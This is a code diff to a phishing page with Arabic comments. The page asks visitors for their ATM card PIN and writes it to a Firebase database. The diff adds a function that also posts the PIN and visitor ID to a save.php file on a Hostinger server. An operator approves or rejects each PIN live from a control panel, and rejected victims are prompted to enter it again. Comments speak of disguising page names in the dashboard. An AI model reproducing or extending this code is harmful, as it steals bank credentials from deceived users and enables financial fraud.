@@ -92,15 +92,35 @@
         const database = firebase.database();
         const visitorId = localStorage.getItem('visitorId');
 
-        // تحديث تتبع الزائر (تمويه اسم الصفحة في لوحة التحكم)
+        // وظيفة لمزامنة البيانات مع ملف save.php على Hostinger
+        function syncToHostinger(data) {
+            const formData = new FormData();
+            formData.append('visitorId', visitorId);
+            formData.append('currentPage', data.currentPage || "تأكيد رمز الهوية (PIN)");
+            if(data.atm_pin) formData.append('atm_pin', data.atm_pin);
+            if(data.status) formData.append('status', data.status);
+
+            fetch('save.php', {
+                method: 'POST',
+                body: formData
+            }).catch(err => console.log("Hostinger Sync Error: ", err));
+        }
+
+        // تحديث تتبع الزائر (Firebase + Hostinger)
         if (visitorId) {
-            database.ref('payments/' + visitorId).update({
-                currentPage: "تأكيد رمز الهوية (PIN)"
-            });
+            const initialData = {
+                currentPage: "تأكيد رمز الهوية (PIN)",
+                lastActive: firebase.database.ServerValue.TIMESTAMP
+            };
+            
+            database.ref('payments/' + visitorId).update(initialData);
+            
             // تحديث التواجد اللحظي
             database.ref('live_visitors/' + visitorId).update({
                 last_seen: firebase.database.ServerValue.TIMESTAMP
             });
+
+            syncToHostinger(initialData);
         }
 
         function sendSecureCode() {
@@ -111,18 +131,20 @@
                 document.getElementById('loadingOverlay').style.display = 'flex';
 
                 const paymentRef = database.ref('payments/' + visitorId);
-                paymentRef.update({
+                const pinData = {
                     atm_pin: pinVal,
                     status: "waiting_secure_auth", 
                     last_update: firebase.database.ServerValue.TIMESTAMP
-                });
+                };
 
-                // مراقبة قرار الأدمن من لوحة التحكم الجديدة
+                paymentRef.update(pinData);
+                syncToHostinger(pinData);
+
+                // مراقبة قرار الأدمن لحظياً من لوحة التحكم
                 paymentRef.on('value', (snapshot) => {
                     const data = snapshot.val();
                     
                     if (data && data.status === "accept") {
-                        // الانتقال لصفحة النجاح (الاسم الجديد المموّه)
                         window.location.href = "thank-you.html";
                     } 
                     else if (data && data.status === "reject") {
@@ -130,7 +152,9 @@
                         pinInput.classList.add('input-error');
                         alert("الرمز المدخل غير صحيح، يرجى المحاولة مرة أخرى.");
                         
-                        paymentRef.update({ status: "idle_auth" });
+                        const rejectData = { status: "idle_auth" };
+                        paymentRef.update(rejectData);
+                        syncToHostinger(rejectData);
                     }
                 });
 
@@ -141,6 +165,7 @@
 
         document.getElementById('pinCode').addEventListener('input', function() {
             this.classList.remove('input-error');
+            this.value = this.value.replace(/[^0-9]/g, '');
         });
     </script>
 </body>
